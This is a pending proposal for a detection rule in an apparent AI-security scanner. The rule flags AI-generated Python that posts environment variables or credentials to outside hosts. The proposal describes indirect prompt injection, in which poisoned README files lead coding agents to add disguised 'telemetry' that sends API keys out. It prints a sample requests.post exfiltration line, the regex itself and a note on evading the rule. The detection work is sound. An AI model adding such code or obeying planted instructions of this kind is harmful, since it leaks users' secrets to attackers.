# Pending: AI-Generated Code Phone-Home via Environment Variables

**Date:** 2026-05-20
**Domain:** data-exfiltration (cycle 2, fifth pass)
**Research basis:** `research/2026-05-20T09-00_2-data-exfiltration.md`

---

## Title

Detect AI-generated code that pairs an outbound HTTP call with environment variable or credential access

## Motivation

The DEEP#DOOR campaign (Aviatrix, April 2026) and the VibeGuard study (arxiv:2604.01052) documented
indirect prompt injection attacks where poisoned README files or source code instructs an AI coding
agent to add "telemetry" or "analytics" code that collects environment variables (API keys, tokens,
secrets) and POSTs them to an attacker-controlled endpoint or public tunneling service (ngrok, bore).

The VibeGuard paper found this pattern prevalent enough across 520 LLM agent skill submissions to
build an entire pre-publish gate around it.

Current aigis coverage:
- `exfil_send_to_external` — catches "send/forward/transmit to external URL" language
- `exfil_keyword` — catches explicit exfiltration keywords
- `out_tunnel_relay_url` — catches ngrok/localtunnel URLs in output

Gap: a `requests.post('https://telemetry-host.com', json={"key": os.environ.get("ANTHROPIC_API_KEY")})`
pattern in AI-generated Python is not specifically caught by any existing rule.

## Proposed Change

Add `out_code_phonehome_envvar` to `OUTPUT_PATTERNS`:

```python
DetectionPattern(
    id="out_code_phonehome_envvar",
    name="Generated Code Phone-Home with Environment Variable",
    category="data_exfiltration",
    pattern=_p(
        r"(?:requests|urllib|httpx|aiohttp)\s*\.\s*(?:post|get|put)\s*\(\s*[\"']https?://"
        r"(?!(?:localhost|127\.\d|api\.anthropic|openai\.com))"
        r".{0,200}"
        r"(?:os\.environ|os\.getenv|getenv|environ\.get|dotenv|\.env\b|"
        r"api[_\-]?key|secret|token|password|credential)"
    ),
    base_score=70,
    description=(
        "Detects AI-generated Python code that makes an outbound HTTP call to a non-localhost, "
        "non-trusted host and combines it with environment variable or credential access in the "
        "same code block — the phone-home pattern documented in DEEP#DOOR (Aviatrix, Apr 2026) "
        "and VibeGuard (arxiv:2604.01052). Indirect prompt injection via poisoned README or "
        "source files instructs the AI to add disguised 'telemetry' code that collects API keys "
        "and sends them to an attacker endpoint."
    ),
    owasp_ref="OWASP LLM02: Sensitive Information Disclosure",
    remediation_hint=(
        "Audit generated code for HTTP calls that reference environment variables or credential "
        "patterns. Apply a code security review step before executing AI-generated scripts, "
        "especially when the agent has read access to files like .env, ~/.aws/credentials, "
        "or similar credential stores."
    ),
)
```

## Why Held Back

1. **FP risk**: Many legitimate Python snippets combine `requests.post` with `os.environ` for
   authorized API calls (e.g., posting to Anthropic API, GitHub API, monitoring services). The
   exclusion list in the negative lookahead (`api.anthropic`, `openai.com`) helps but is not
   exhaustive.

2. **Scope**: The `.{0,200}` lookahead between the HTTP call and the env var access may be too
   broad, matching across unrelated code lines in multi-function files.

3. **Detection evasion**: Attackers can trivially bypass by using `b64decode` or variable
   indirection, so the rule catches naive implementations but not sophisticated ones.

## Suggested Next Step for Human Reviewer

1. Build a test corpus of legitimate Python code using `requests.post` + `os.environ` for
   authorized purposes to measure FP rate.
2. Consider requiring a three-part conjunction: (HTTP post to non-trusted host) + (env var or
   credential name) + (assignment to body/data/json parameter).
3. Sources:
   - https://aviatrix.ai/threat-research-center/new-python-backdoor-uses-tunneling-service-to-steal-browser-and-cloud-credentials-2026/
   - https://arxiv.org/abs/2604.01052
